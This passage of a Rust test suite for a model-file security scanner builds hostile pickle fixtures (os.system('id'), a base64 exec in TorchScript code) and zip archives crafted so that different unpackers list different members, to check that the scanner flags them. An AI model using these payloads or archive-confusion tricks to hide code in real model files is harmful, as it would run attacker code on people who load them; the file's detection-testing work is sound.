        let n = b.len();
        b[n - 14..n - 12].copy_from_slice(&count.to_le_bytes());
        b[n - 12..n - 10].copy_from_slice(&count.to_le_bytes());
        let f = one("m.npz", &b);
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "bad.npy") && has(&f, "SC-TRUNCATED", "CRITICAL", "counts"), "{count}: {f:?}");
        assert!(rd("m.npz", &b).unwrap().opaque);
    }
    // zip64: the count in the zip64 record
    let v = virtual_zip(vec![("ok.npy", 0, Seg::B(good.clone()), good.len() as u64), ("bad.npy", 0, Seg::B(bad.clone()), bad.len() as u64),
                             ("pad", 0, Seg::Z(0xFFFF_FFFF), 0xFFFF_FFFF)]);
    let mut tail = match v.segs.last() { Some((_, Seg::B(t))) => t.clone(), _ => unreachable!() };
    let z64 = tail.windows(4).position(|w| w == b"PK\x06\x06").unwrap();
    tail[z64 + 24..z64 + 32].copy_from_slice(&1u64.to_le_bytes());
    tail[z64 + 32..z64 + 40].copy_from_slice(&1u64.to_le_bytes());
    let mut segs = v.segs;
    let k = segs.len() - 1;
    segs[k].1 = Seg::B(tail);
    let (r, ..) = by_range("m.npz", &Virtual { segs, size: v.size });
    assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "bad.npy") && has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "counts"),
            "{:?}", rules(&r));
}

/// A ustar archive of (name, bytes): the legacy torch.save layout's.
fn tar_of(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut out = Vec::new();
    for (name, body) in members {
        let mut h = vec![0u8; 512];
        h[..name.len()].copy_from_slice(name.as_bytes());
        h[100..107].copy_from_slice(b"0000644");
        let size = format!("{:011o}", body.len());
        h[124..135].copy_from_slice(size.as_bytes());
        h[136..147].copy_from_slice(b"00000000000");
        h[156] = b'0';
        h[257..263].copy_from_slice(b"ustar\0");
        h[263..265].copy_from_slice(b"00");
        h[148..156].copy_from_slice(b"        ");
        let sum: u32 = h.iter().map(|&c| c as u32).sum();
        h[148..155].copy_from_slice(format!("{sum:06o}\0").as_bytes());
        out.extend_from_slice(&h);
        out.extend_from_slice(body);
        out.resize(out.len().div_ceil(512) * 512, 0);
    }
    out.resize(out.len() + 1024, 0);
    out
}

#[test]
fn h3_every_copy_of_a_legacy_tar_member_is_read() {
    let storages = [P::default().proto(2).int(0).stop(), P::default().proto(2).raw(b"]").stop()].concat();
    let tensors = P::default().proto(2).int(0).stop();
    let ok = P::default().proto(2).none().stop();
    let t = tar_of(&[("storages", &storages), ("tensors", &tensors), ("pickle", &ok), ("pickle", &os_system("id"))]);
    let r = rd("m.pt", &t).unwrap();
    assert!(r.opaque && has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "pickle (copy 2 of 2)"), "{:?}", rules(&r));
    // the hostile copy first, the benign last: found as well
    let t = tar_of(&[("storages", &storages), ("tensors", &tensors), ("pickle", &os_system("id")), ("pickle", &ok)]);
    assert!(has(&one("m.pt", &t), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    // two storages or tensors records: which the loader reads cannot be told (SC-TRUNCATED)
    let t = tar_of(&[("storages", &storages), ("storages", &storages), ("tensors", &tensors), ("pickle", &ok)]);
    assert!(has(&one("m.pt", &t), "SC-TRUNCATED", "CRITICAL", "2 members named storages"));
    // one of each: quiet
    let r = rd("m.pt", &tar_of(&[("storages", &storages), ("tensors", &tensors), ("pickle", &ok)])).unwrap();
    assert!(r.issues.is_empty() && !r.opaque, "{:?}", rules(&r));
    // a larger one of which a scan read fewer bytes than its magic's (a member limit of 128): its pickle unread, said
    let p = crate::pack::current();
    let t = tar_of(&[("storages", &storages), ("tensors", &tensors), ("pickle", &os_system("id"))]);
    for n in [101, 129, 261] {
        assert!(sniff(&p, &u("m.pt"), &t[..n], false), "{n}");
        let r = read_file(&p, &u("m.pt"), &t[..n], t.len() as u64, Some(128), false).unwrap();
        assert!(has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "so the model file's pickle was not read"), "{n}");
    }
    // ... and not a file that is all of those bytes, nor a name without its NUL
    assert!(rd("m.pt", &t[..129]).is_none() && !sniff(&p, &u("m.pt"), b"pickle", false));
}

#[test]
fn h4_a_nested_load_not_read_is_said() {
    let ck = |p: &[u8]| zip_of(&[("archive/data.pkl", p), ("archive/byteorder", b"little"), ("archive/version", b"3\n")]);
    let part = |b: &[u8]| P::default().global("torch.storage", "_load_from_bytes").bytes(&ck(b)).t1().reduce().raw(b"0");
    for n in [0usize, 1, 63, 64, 65] {
        let mut p = P::default().proto(2);
        for _ in 0..n {
            p = p.raw(&part(&P::default().proto(2).none().stop()).0);
        }
        let outer = p.raw(&part(&os_system("id")).0).none().stop();
        for (what, f) in [("raw", one("m.pkl", &outer)), ("checkpoint", one("m.pt", &ck(&outer)))] {
            if n < 64 {
                assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "os.system"), "{n} {what}: {f:?}");
            } else {
                assert!(has(&f, "SC-TRUNCATED", "CRITICAL", "were not read (more than 64 nested loads)"), "{n} {what}: {f:?}");
            }
        }
    }
}

#[test]
fn h6_a_checkpoint_member_is_the_formats_only_by_its_content() {
    let ck = |more: &[(&str, &[u8])]| {
        let mut e: Vec<(&str, &[u8])> = vec![("archive/data.pkl", b"\x80\x02N."), ("archive/byteorder", b"little"), ("archive/version", b"3\n")];
        e.extend_from_slice(more);
        zip_of(&e)
    };
    let inner = zip_of(&[("x.txt", b"x")]);
    let exe = [b"MZ".as_slice(), &[0u8; 256]].concat();
    // an executable, an archive, a file of other bytes: the archive holds more than its format (SC-NESTED-ARCHIVE),
    // and a program or an archive inside is what it would be at the top, named for the member
    for (name, body, rule) in [("archive/extra/tool.exe", exe.as_slice(), Some(("SC-BINARY", "MAJOR"))),
                               ("archive/extra/inner.zip", inner.as_slice(), Some(("SC-NESTED-ARCHIVE", "MINOR"))),
                               ("archive/tool.exe", exe.as_slice(), Some(("SC-BINARY", "MAJOR"))),
                               ("archive/extra/notes.txt", b"hello", None)] {
        let r = rd("m.pt", &ck(&[(name, body)])).unwrap();
        assert!(r.opaque, "{name}");
        match rule {
            Some((rule, sev)) => assert!(has(&rules(&r), rule, sev, &format!("In {name}")), "{name}: {:?}", rules(&r)),
            None => assert!(r.issues.is_empty(), "{name}: {:?}", rules(&r)),
        }
    }
    // a pickle, whatever its name: read as one, and the archive opaque too
    for name in ["archive/extra/hidden.pickle", "archive/extra/hidden.pkl", "archive/extra/hidden", "archive/x.bin"] {
        let r = rd("m.pt", &ck(&[(name, &os_system("id"))])).unwrap();
        assert!(r.opaque && has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", name), "{name}: {:?}", rules(&r));
    }
    let p0 = b"(S'id'\ncos\nsystem\n.";                                   // (protocol 0, INST after a MARK)
    let r = rd("m.pt", &ck(&[("archive/extra/p0", &p0[..])])).unwrap();
    assert!(r.opaque && has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "os.system"), "{:?}", rules(&r));
    // the format's records hold what the format writes there
    let r = rd("m.pt", &ck(&[])).unwrap();
    assert!(r.issues.is_empty() && !r.opaque);
    let bad = zip_of(&[("archive/data.pkl", b"\x80\x02N."), ("archive/byteorder", b"MZ\x90\x00"), ("archive/version", b"3\n")]);
    assert!(rd("m.pt", &bad).unwrap().opaque);
    // a TorchScript archive: its code scanned as Python, its constants' storages raw, its __torch__ classes its own
    let code_ok = b"class Net(Module):\n  __parameters__ = [\"weight\", ]\n  weight : Tensor\n  def forward(self: __torch__.Net,\n    x: Tensor) -> Tensor:\n    return torch.matmul(x, self.weight)\n";
    let consts = P::default().proto(2).global("__torch__.Net", "Net").s("https://example.invalid/w").t1().reduce().stop();
    let ts = |code: &[u8]| zip_of(&[("m/data.pkl", &consts), ("m/constants.pkl", b"\x80\x02).".as_slice()),
                                    ("m/code/__torch__.py", code), ("m/code/__torch__.py.debug_pkl", b"\x80\x02).".as_slice()),
                                    ("m/constants/0", &[0u8; 16]), ("m/version", b"3\n")]);
    let r = rd("m.pt", &ts(code_ok)).unwrap();
    assert!(r.issues.is_empty() && !r.opaque && r.calls.is_empty(), "{:?}", rules(&r));
    let code_bad = b"import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n";
    let r = rd("m.pt", &ts(code_bad)).unwrap();
    assert!(has(&rules(&r), "SC-EVAL-DECODE", "BLOCKER", "In m/code/__torch__.py, TorchScript code in the model file: "),
            "{:?}", rules(&r));
}

#[test]
fn h7_what_build_state_gives_an_object_is_seen_past_the_reader_s_bounds() {
    let touch = |p: P| p.global("pathlib", "Path.touch");
    // SimpleNamespace(), then a state of n pairs and __setstate__, then a second BUILD: by SETITEMS, SETITEM, DICT
    for n in [0usize, 31, 32, 63, 64, 65, 128, 300] {
        let pad = |mut p: P| { for i in 0..n { p = p.s(&format!("padding_{i}")).none(); } p };
        let head = || P::default().proto(4).global("types", "SimpleNamespace").et().reduce();
        let tail = |p: P| p.build().global("pathlib", "Path").s("/tmp/x").t1().reduce().build().stop();
        let setitems = tail(touch(pad(head().ed().mark()).s("__setstate__")).setitems());
        let mut setitem = head().ed();
        for i in 0..n {
            setitem = setitem.s(&format!("padding_{i}")).none().setitem();
        }
        let setitem = tail(touch(setitem.s("__setstate__")).setitem());
        let dict = tail(touch(pad(head().mark()).s("__setstate__")).raw(b"d"));
        let memo = tail(touch(pad(head().ed().binput(0).mark()).s("__setstate__")).setitems().raw(b"0").binget(0));
        let slots = tail(touch(pad(head().none().ed().mark()).s("__setstate__")).setitems().t2());
        for (what, b) in [("SETITEMS", setitems), ("SETITEM", setitem), ("DICT", dict), ("memoized", memo), ("slots", slots)] {
            let f = one("m.pkl", &b);
            assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "__setstate__"), "{n} {what}: {f:?}");
            if what != "memoized" {
                assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "the __setstate__ an earlier BUILD gave the object"), "{n} {what}: {f:?}");
            }
        }
    }
    // a key the pickle computes with a callable value: not known (SC-TRUNCATED)
    let k = P::default().proto(2).global("types", "SimpleNamespace").et().reduce().ed()
        .global("builtins", "str").s("__setstate__").t1().reduce().global("pathlib", "Path.touch").setitem().build().stop();
    assert!(has(&one("m.pkl", &k), "SC-TRUNCATED", "CRITICAL", "computes"), "{:?}", one("m.pkl", &k));
    // a numpy scalar of a number (LightGBM's class map, {np.int64(0): np.int64(0)}) is data, as a key and as a value,
    // however many; one of a str dtype is a key that may be any name: with a callable value, not known
    let scalar = |p: P, code: &str, b: &[u8]| p.global("numpy._core.multiarray", "scalar").global("numpy", "dtype").s(code)
        .raw(b"\x89\x88").t3().reduce().bytes(b).t2().reduce();
    let mut map = P::default().proto(2).global("types", "SimpleNamespace").et().reduce().ed().mark();
    for i in 0..300u64 {
        map = scalar(scalar(map, "i8", &i.to_le_bytes()), "<i8", &i.to_le_bytes());
    }
    let map = map.setitems().build().stop();
    assert!(one("m.pkl", &map).is_empty(), "{:?}", one("m.pkl", &map));
    for code in ["<U12", "O", "V8"] {
        let named = scalar(P::default().proto(2).global("types", "SimpleNamespace").et().reduce().ed(), code, &[0u8; 48])
            .global("mypkg.helpers", "run").setitem().build().stop();
        assert!(has(&one("m.pkl", &named), "SC-TRUNCATED", "CRITICAL", "computes"), "{code}: {:?}", one("m.pkl", &named));
    }
    // a state deeper than the look goes: SC-TRUNCATED
    let mut deep = P::default().proto(2).global("types", "SimpleNamespace").et().reduce();
    for _ in 0..40 {
        deep = deep.raw(b"]");
    }
    for _ in 0..39 {
        deep = deep.raw(b"a");
    }
    let deep = deep.build().stop();
    assert!(has(&one("m.pkl", &deep), "SC-TRUNCATED", "CRITICAL", "deeper than"), "{:?}", one("m.pkl", &deep));
    // a large benign state stays quiet
    let mut big = P::default().proto(2).global("types", "SimpleNamespace").et().reduce().ed().mark();
    for i in 0..500 {
        big = big.s(&format!("k{i}")).raw(b"]").int(1).raw(b"a");
    }
    let big = big.setitems().build().stop();
    assert!(one("m.pkl", &big).is_empty(), "{:?}", one("m.pkl", &big));
}

#[test]
fn m2_a_many_member_npz_by_range_is_charged_each_byte_once() {
    let a = npy("'<f8'", &[0u8; 64]);
    let names: Vec<String> = (0..20_000).map(|k| format!("a{k:05}.npy")).collect();
    let entries: Vec<(&str, &[u8], bool)> = names.iter().map(|n| (n.as_str(), a.as_slice(), true)).collect();
    let z = zip_m(&entries);
    let r = rd("m.npz", &z).unwrap();
    assert!(r.issues.is_empty() && !r.opaque, "{:?}", rules(&r));
    let v = Virtual { segs: vec![(0, Seg::B(z.clone()))], size: z.len() as u64 };
    let (r, read, _) = by_range("m.npz", &v);
    assert!(r.issues.is_empty() && !r.opaque, "{:?}", rules(&r));
    assert!(read < 3 * z.len() as u64, "{read} of {}", z.len());
    // kept as a stream passed (the registry's, one piece per member, each touching the last): one reading, in time
    let p = crate::pack::current();
    let given: Vec<(u64, &[u8])> = z.chunks(253).enumerate().map(|(k, c)| (k as u64 * 253, c)).collect();
    let t = std::time::Instant::now();
    let src = zip::Bytes::pieces(z.len() as u64, given, range_cap(&p));
    let Ranged::Report(r) = read_ranges(&p, &u("m.npz"), &src, false, true) else { panic!("not read") };
    assert!(r.issues.is_empty() && !r.opaque, "{:?}", rules(&r));
    assert!(t.elapsed().as_secs() < 20, "{:?}", t.elapsed());
    // overlapping requests are charged once
    let b = zip::Bytes::pieces(10_000, vec![(0, &[0u8; 100][..])], 3_000);
    for _ in 0..50 {
        b.note(50, 2_000).unwrap();
    }
    assert!(b.note(2_050, 2_000).is_err());
}

#[test]
fn m3_an_extension_code_called_is_major() {
    for ext in [&[0x82u8, 0x01][..], &[0x83, 0x01, 0x00], &[0x84, 0x01, 0x00, 0x00, 0x00]] {
        let called = P::default().proto(2).raw(ext).s("true").t1().reduce().stop();
        assert!(has(&one("m.pkl", &called), "SC-PICKLE-GLOBAL", "MAJOR", "extension code 1"), "{:?}", one("m.pkl", &called));
        let made = P::default().proto(2).raw(ext).et().newobj().stop();
        assert!(has(&one("m.pkl", &made), "SC-PICKLE-GLOBAL", "MAJOR", "extension code 1"));
        // pushed and never called: what it is is never used
        let kept = P::default().proto(2).raw(ext).et().t2().stop();
        assert!(one("m.pkl", &kept).is_empty());
    }
}

#[test]
fn m4_torch_s_own_names_are_trusted_in_a_torchscript_archive_only() {
    let call = P::default().proto(2).global("__torch__.review", "run").s("https://example.invalid/x").t1().reduce().stop();
    let r = rd("m.pkl", &call).unwrap();
    assert!(rules(&r).iter().any(|(rule, sev, msg)| rule == "SC-PICKLE-GLOBAL" && sev == "MAJOR" && msg.contains("__torch__.review.run")),
            "{:?}", rules(&r));
    let r = rd("m.pt", &checkpoint(&call)).unwrap();
    assert!(!r.calls.is_empty(), "a torch.save checkpoint is no TorchScript archive: {:?}", rules(&r));
}

// ---- the zip's views (FP-NESTED-ARCHIVE's review of Oct 21: shapes unpackers read differently) ----------------------

/// A stored local header and its data, its flags `flags` (8: sizes in a data descriptor after the data).
fn zloc(name: &[u8], data: &[u8], flags: u16, extra: &[u8]) -> Vec<u8> {
    let crc = lazaret_verify::inflate::crc32(0, data);
    let sizes = if flags & 8 != 0 { 0 } else { data.len() as u32 };
    let mut h = b"PK\x03\x04\x14\x00".to_vec();
    h.extend_from_slice(&flags.to_le_bytes());
    h.extend_from_slice(&[0u8; 6]);                                       // method (stored), time, date
    h.extend_from_slice(&(if flags & 8 != 0 { 0 } else { crc }).to_le_bytes());
    h.extend_from_slice(&sizes.to_le_bytes());
    h.extend_from_slice(&sizes.to_le_bytes());
    h.extend_from_slice(&(name.len() as u16).to_le_bytes());
    h.extend_from_slice(&(extra.len() as u16).to_le_bytes());
    h.extend_from_slice(name);
    h.extend_from_slice(extra);
    h.extend_from_slice(data);
    if flags & 8 != 0 {
        h.extend_from_slice(b"PK\x07\x08");
        h.extend_from_slice(&crc.to_le_bytes());
        h.extend_from_slice(&(data.len() as u32).to_le_bytes());
        h.extend_from_slice(&(data.len() as u32).to_le_bytes());
    }
    h
}

/// A central directory entry: `size` bytes stored at `local`, made by a Unix system with `mode`.
fn zcen(name: &[u8], data: &[u8], size: u32, local: u32, flags: u16, mode: u32) -> Vec<u8> {
    let mut c = b"PK\x01\x02\x1e\x03\x14\x00".to_vec();                // made by Unix (3), version 3.0; needs 2.0
    c.extend_from_slice(&flags.to_le_bytes());
    c.extend_from_slice(&[0u8; 6]);
    c.extend_from_slice(&lazaret_verify::inflate::crc32(0, data).to_le_bytes());
    c.extend_from_slice(&size.to_le_bytes());
    c.extend_from_slice(&size.to_le_bytes());
    c.extend_from_slice(&(name.len() as u16).to_le_bytes());
    c.extend_from_slice(&[0u8; 8]);                                       // extra, comment, disk, internal
    c.extend_from_slice(&(mode << 16).to_le_bytes());
    c.extend_from_slice(&local.to_le_bytes());
    c.extend_from_slice(name);
    c
}

fn zend(count: u16, size: usize, off: usize, comment: &[u8]) -> Vec<u8> {
    let mut e = b"PK\x05\x06\x00\x00\x00\x00".to_vec();
    e.extend_from_slice(&count.to_le_bytes());
    e.extend_from_slice(&count.to_le_bytes());
    e.extend_from_slice(&(size as u32).to_le_bytes());
    e.extend_from_slice(&(off as u32).to_le_bytes());
    e.extend_from_slice(&(comment.len() as u16).to_le_bytes());
    e.extend_from_slice(comment);
    e
}

#[test]
fn every_member_any_unpacker_finds_is_read() {
    let ok = npy("'<i8'", &[0u8; 24]);
    let bad = npy("'|O'", &os_system("id"));
    let (lok, lbad) = (zloc(b"ok.npy", &ok, 0, b""), zloc(b"bad.npy", &bad, 0, b""));
    let cok = |at: usize| zcen(b"ok.npy", &ok, ok.len() as u32, at as u32, 0, 0o100644);
    let cbad = |at: usize| zcen(b"bad.npy", &bad, bad.len() as u32, at as u32, 0, 0o100755);
    let listing = |z: &[u8]| zip::entries(&zip::Bytes::whole(z), 100_000, 1 << 24).unwrap();
    // each shape: bad.npy among the members, the listing ambiguous for `why`, and the model reader's answer its
    // payload and SC-TRUNCATED, whole and by range
    let check = |what: &str, z: &[u8], why: &str| {
        let l = listing(z);
        let names: Vec<String> = l.entries.iter().map(|e| String::from_utf8_lossy(&e.name).into()).collect();
        assert!(names.iter().any(|n| n == "bad.npy"), "{what}: {names:?}");
        assert!(l.ambiguous.iter().any(|a| a.contains(why)), "{what}: {:?}", l.ambiguous);
        // (the payload's finding named for the first member that holds it: z5's directory name)
        let f = one("m.npz", z);
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "os.system") && has(&f, "SC-TRUNCATED", "CRITICAL", "may not list"),
                "{what}: {f:?}");
        let (r, ..) = by_range("m.npz", &Virtual::of(z.to_vec()));
        assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "os.system") && has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "may not list"),
                "{what} by range: {:?}", rules(&r));
    };
    let cd = [cok(0), cbad(lok.len())].concat();
    let body = [lok.clone(), lbad.clone()].concat();
    // the control: one view, no doubt; a Unix mode and its execute bit (FP-NESTED-ARCHIVE's reader)
    let z = [body.clone(), cd.clone(), zend(2, cd.len(), body.len(), b"")].concat();
    let l = listing(&z);
    assert!(l.ambiguous.is_empty() && l.entries.len() == 2, "{:?}", l.ambiguous);
    assert_eq!((l.entries[0].unix_mode(), l.entries[0].executable()), (Some(0o100644), false));
    assert_eq!((l.entries[1].unix_mode(), l.entries[1].executable()), (Some(0o100755), true));
    assert!(l.entries.iter().all(|e| e.listed && e.made_by >> 8 == 3));
    assert!(has(&one("m.npz", &z), "SC-PICKLE-CODE", "CRITICAL", "bad.npy") && !has(&one("m.npz", &z), "SC-TRUNCATED", "CRITICAL", ""));
    // a local extra field the directory has not (PyTorch pads its data so), and sizes in a data descriptor: no doubt
    let lpad = zloc(b"ok.npy", &ok, 0, &[0x46, 0x42, 4, 0, 0, 0, 0, 0]);
    let ldd = zloc(b"bad.npy", &bad, 8, b"");
    let cd2 = [cok(0), zcen(b"bad.npy", &bad, bad.len() as u32, lpad.len() as u32, 8, 0o100644)].concat();
    let z = [lpad.clone(), ldd.clone(), cd2.clone(), zend(2, cd2.len(), lpad.len() + ldd.len(), b"")].concat();
    assert!(listing(&z).ambiguous.is_empty(), "{:?}", listing(&z).ambiguous);
    // z1: the end record counts 0 or 1 of the 2 entries its directory holds (zipfile, jszip and unzipper's Parse
    // extract bad.npy; adm-zip and yauzl go by the count)
    for n in [0u16, 1] {
        check(&format!("count {n}"), &[body.clone(), cd.clone(), zend(n, cd.len(), body.len(), b"")].concat(), "counts");
    }
    // z2: a zip64 record and locator before an end record that is not saturated (zipfile, adm-zip, yauzl, jszip and
    // unzipper take the zip64 record's 2 entries; miniz the end record's 1)
    let mut z64 = b"PK\x06\x06".to_vec();
    z64.extend_from_slice(&44u64.to_le_bytes());
    z64.extend_from_slice(&[0x2d, 0, 0x2d, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
    z64.extend_from_slice(&2u64.to_le_bytes());
    z64.extend_from_slice(&2u64.to_le_bytes());
    z64.extend_from_slice(&(cd.len() as u64).to_le_bytes());
    z64.extend_from_slice(&(body.len() as u64).to_le_bytes());
    let mut loc64 = b"PK\x06\x07\x00\x00\x00\x00".to_vec();
    loc64.extend_from_slice(&((body.len() + cd.len()) as u64).to_le_bytes());
    loc64.extend_from_slice(&1u32.to_le_bytes());
    check("zip64 unsaturated", &[body.clone(), cd.clone(), z64.clone(), loc64.clone(),
                                 zend(1, cd.len() + 76, body.len(), b"")].concat(), "zip64 record");
    // ... and one that agrees with its end record: no doubt
    let z = [body.clone(), cd.clone(), z64, loc64, zend(2, cd.len(), body.len(), b"")].concat();
    assert!(listing(&z).ambiguous.is_empty(), "{:?}", listing(&z).ambiguous);
    // z3: two directories, the end record's offset naming one (bad.npy: adm-zip, yauzl, unzipper) and its place and
    // size the other (ok.npy: zipfile, its offsets moved by the difference)
    let (l1, l2) = (zloc(b"bad.npy", &bad, 0, b""), zloc(b"ok.npy", &ok, 0, b""));
    let da = zcen(b"bad.npy", &bad, bad.len() as u32, 0, 0, 0o100644);
    let db = zcen(b"ok.npy", &ok, ok.len() as u32, (l1.len() - da.len()) as u32, 0, 0o100644);
    check("two directories", &[l1.clone(), l2.clone(), da.clone(), db.clone(), zend(1, db.len(), l1.len() + l2.len(), b"")].concat(),
          "by its offset");
    // z4: a member no directory lists before one it does (unzipper's Parse extracts it)
    let one_cd = zcen(b"ok.npy", &ok, ok.len() as u32, lbad.len() as u32, 0, 0o100644);
    check("local only", &[lbad.clone(), lok.clone(), one_cd.clone(), zend(1, one_cd.len(), lbad.len() + lok.len(), b"")].concat(),
          "no central directory lists");
    // z5: the directory names ok.npy, the local header bad.npy (adm-zip, yauzl, jszip and unzipper go by the local
    // header's)
    let named = zcen(b"ok.npy", &bad, bad.len() as u32, 0, 0, 0o100644);
    check("name mismatch", &[lbad.clone(), named.clone(), zend(1, named.len(), lbad.len(), b"")].concat(), "local header of");
    // z11: the directory says 0 bytes (zipfile reads an empty member), the local header the data's (none of the
    // review's unpackers extracted it: a disagreement all the same, and the local header's view a member too)
    let empty = zcen(b"bad.npy", &bad, 0, 0, 0, 0o100644);
    check("directory size 0", &[lbad.clone(), empty.clone(), zend(1, empty.len(), lbad.len(), b"")].concat(), "local header of");
    // z8: bad.npy\0.txt, which zipfile names bad.npy
    let (ln, cn) = (zloc(b"bad.npy\0.txt", &bad, 0, b""), zcen(b"bad.npy\0.txt", &bad, bad.len() as u32, 0, 0, 0o100644));
    check("NUL", &[ln.clone(), cn.clone(), zend(1, cn.len(), ln.len(), b"")].concat(), "NUL");
    // z9: a zip (bad.npy) and then another (ok.npy, its offsets its own: zipfile reads it; unzipper's Parse the first)
    let za = [lbad.clone(), cbad(0), zend(1, cbad(0).len(), lbad.len(), b"")].concat();
    let zb = [lok.clone(), cok(0), zend(1, cok(0).len(), lok.len(), b"")].concat();
    check("zip then zip", &[za, zb].concat(), "no central directory lists");
    // z10: a fake end record (1 entry) in the real one's comment (jszip and unzipper read bad.npy)
    let fake = zend(1, cd.len() + 22, body.len(), b"");
    check("end record in the comment", &[body.clone(), cd.clone(), zend(2, cd.len(), body.len(), &fake)].concat(),
          "end records");
    // bytes before the first member (offsets that count them: a self-extractor's, which zipfile and unzip read and
    // unzipper's Parse cannot): ambiguous, and no model file (np.load and torch.load tell a zip by its first bytes)
    let stub = vec![0x4du8; 100];
    let shifted = [cok(100), cbad(100 + lok.len())].concat();
    let z = [stub, body.clone(), shifted.clone(), zend(2, shifted.len(), 100 + body.len(), b"")].concat();
    let l = listing(&z);
    assert!(l.entries.len() == 2 && l.ambiguous.iter().any(|a| a.contains("before its first member")), "{:?}", l.ambiguous);
    assert!(rd("m.npz", &z).is_none());
    // ... and after the end record (zipfile finds the record by searching; yauzl wants its comment to end the file)
    check("after", &[body.clone(), cd.clone(), zend(2, cd.len(), body.len(), b""), b"trailing".to_vec()].concat(),
          "after its end record");
    // b1: members that share their data (a zip bomb's: zipfile and the Node unpackers extract each), each read
    // charged to the inflate budget
    let shared: Vec<u8> = (0..50).flat_map(|k| zcen(format!("b{k:02}.npy").as_bytes(), &bad, bad.len() as u32, 0, 0, 0o100644)).collect();
    let z = [lbad.clone(), shared.clone(), zend(50, shared.len(), lbad.len(), b"")].concat();
    let l = listing(&z);
    assert!(l.ambiguous.iter().any(|a| a.contains("overlap")), "{:?}", l.ambiguous);
    assert!(has(&one("m.npz", &z), "SC-TRUNCATED", "CRITICAL", "may not list"));
}

#[test]
fn a_subtype_constructor_makes_data_only_of_the_formats_own_types() {
    // H2, the external re-review of Oct 27: UserDict(), its state's __setstate__ what _reconstruct(<class>, (0,), b'b')
    // made, then BUILD again: a subclass of ndarray with __call__ is a callable; numpy.ndarray's is data
    let made = |m: &str, n: &str| P::default().proto(4).global("collections", "UserDict").et().reduce().ed()
        .s("__setstate__").global("numpy._core.multiarray", "_reconstruct").global(m, n).int(0).t1().bytes(b"b").t3()
        .reduce().setitem().build().none().build().stop();
    let f = one("m.pkl", &made("review_array", "CallableArray"));
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "__setstate__"), "{f:?}");
    for (m, n) in [("numpy", "ndarray"), ("numpy.ma.core", "MaskedArray"), ("numpy", "recarray")] {
        let f = one("m.pkl", &made(m, n));
        assert!(!has(&f, "SC-PICKLE-CODE", "CRITICAL", ""), "{m}.{n}: {f:?}");
    }
    // ... and as a computed key's value, past the reader's bounds: kept, and not known
    let mut map = P::default().proto(4).global("types", "SimpleNamespace").et().reduce().ed().mark();
    for i in 0..300u64 {
        map = map.global("numpy._core.multiarray", "scalar").global("numpy", "dtype").s("<U4").raw(b"\x89\x88").t3()
            .reduce().bytes(&i.to_le_bytes()).t2().reduce()
            .global("numpy._core.multiarray", "_reconstruct").global("review_array", "CallableArray").int(0).t1()
            .bytes(b"b").t3().reduce();
    }
    let f = one("m.pkl", &map.setitems().build().stop());
    assert!(has(&f, "SC-TRUNCATED", "CRITICAL", "computes"), "{f:?}");
}

/// An entry of zip_x: (name, data, central extra, local extra, mode).
type Zx<'a> = (&'a [u8], &'a [u8], Vec<u8>, Vec<u8>, u32);

/// A stored zip whose entries carry central and local extra fields.
fn zip_x(entries: &[Zx]) -> Vec<u8> {
    let mut body = Vec::new();
    let mut cd = Vec::new();
    for (name, data, cx, lx, mode) in entries {
        let at = body.len() as u32;
        body.extend(zloc(name, data, 0, lx));
        let mut c = zcen(name, data, data.len() as u32, at, 0, *mode);
        c[30..32].copy_from_slice(&(cx.len() as u16).to_le_bytes());
        c.extend_from_slice(cx);
        cd.extend(c);
    }
    [body.clone(), cd.clone(), zend(entries.len() as u16, cd.len(), body.len(), b"")].concat()
}

/// Info-ZIP's Unicode Path extra field: version, the CRC-32 of `raw`, `name`.
fn upath(version: u8, raw: &[u8], name: &[u8]) -> Vec<u8> {
    let mut x = 0x7075u16.to_le_bytes().to_vec();
    x.extend_from_slice(&((5 + name.len()) as u16).to_le_bytes());
    x.push(version);
    x.extend_from_slice(&lazaret_verify::inflate::crc32(0, raw).to_le_bytes());
    x.extend_from_slice(name);
    x
}

#[test]
fn a_unicode_path_name_is_a_member_s_name_too() {
    // H1, the external re-review of Oct 27: a storage's entry whose Unicode Path extra names it archive/hidden.pkl
    // (Info-ZIP's `unzip -Z1` lists that name; zipfile the raw one): read as that member, and the listing ambiguous
    let raw: &[u8] = b"archive/data/0";
    let bad = os_system("id");
    let ck = |cx: Vec<u8>, lx: Vec<u8>| {
        let e: Vec<Zx> = vec![(&b"archive/data.pkl"[..], &b"\x80\x02}."[..], vec![], vec![], 0o100644),
                              (&b"archive/version"[..], &b"3\n"[..], vec![], vec![], 0o100644),
                              (raw, bad.as_slice(), cx, lx, 0o100644)];
        zip_x(&e)
    };
    let listing = |z: &[u8]| zip::entries(&zip::Bytes::whole(z), 1000, 1 << 20).unwrap();
    for (what, z) in [("central", ck(upath(1, raw, b"archive/hidden.pkl"), vec![])),
                      ("local", ck(vec![], upath(1, raw, b"archive/hidden.pkl"))),
                      ("both", ck(upath(1, raw, b"archive/hidden.pkl"), upath(1, raw, b"archive/hidden.pkl")))] {
        let l = listing(&z);
        assert!(l.entries.iter().any(|e| e.name == b"archive/hidden.pkl") && l.is_ambiguous(), "{what}: {:?}", l.ambiguous);
        let f = one("m.pt", &z);
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "os.system") && has(&f, "SC-TRUNCATED", "CRITICAL", "may not list"),
                "{what}: {f:?}");
    }
    // central and local extras that name it differently: both names, ambiguous
    let z = ck(upath(1, raw, b"archive/a.pkl"), upath(1, raw, b"archive/b.pkl"));
    let l = listing(&z);
    let names: [&[u8]; 3] = [b"archive/a.pkl", b"archive/b.pkl", raw];
    for n in names {
        assert!(l.entries.iter().any(|e| e.name == n), "{:?}", String::from_utf8_lossy(n));
    }
